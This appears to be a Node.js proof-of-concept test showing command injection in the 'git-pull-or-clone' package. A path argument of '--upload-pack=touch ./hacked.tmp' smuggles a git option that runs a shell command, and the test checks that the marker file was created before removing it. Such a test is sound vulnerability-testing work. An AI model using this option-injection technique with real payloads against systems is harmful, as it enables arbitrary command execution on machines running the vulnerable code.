const { test } = require("node:test");
const { equal } = require("node:assert");
const { existsSync, rmSync } = require("node:fs");

test("Vulnerable to Command Injection", async () => {
  const gitPullOrClone = require("git-pull-or-clone");
  const repo = "file:///tmp/zero12345";
  const path = "--upload-pack=touch ./hacked.tmp";

  await new Promise((resolve, reject) => {
    gitPullOrClone(repo, path, (err) => {
      resolve();
    });
  });

  // Check if the file was created
  equal(existsSync("hacked.tmp"), true);

  // Clean up the created file
  rmSync("hacked.tmp");
});
